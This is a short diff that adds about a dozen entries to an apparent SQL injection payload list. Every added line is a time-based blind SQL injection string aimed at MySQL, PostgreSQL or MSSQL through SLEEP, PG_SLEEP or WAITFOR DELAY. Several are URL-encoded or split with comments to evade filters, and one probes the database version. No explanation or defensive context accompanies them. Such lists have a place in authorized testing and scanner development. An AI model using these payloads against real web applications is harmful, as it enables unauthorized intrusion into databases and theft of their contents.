@@ -44,6 +44,18 @@ if(now()=sysdate()%2Csleep(8)%2C0)
 0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
 0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
 OR(sleep(7))OR
+-5)%200R%20874=(SELECT%20874%20FROM%20PG_SLEEP(6))--
+%20union%20select%201,2,@@VERSION%23
+') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*
+0'XOR(if(now()=sysdate(),sleep(4*4),0))XOR'Z.php
+1'=sleep(10)='1
+1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)
+419523%20AND%20SLEEP(15)
+51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
+if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
+orwa';%20waitfor%20delay%20'0:0:6'%20--%20
 
 MySQL Blind
 
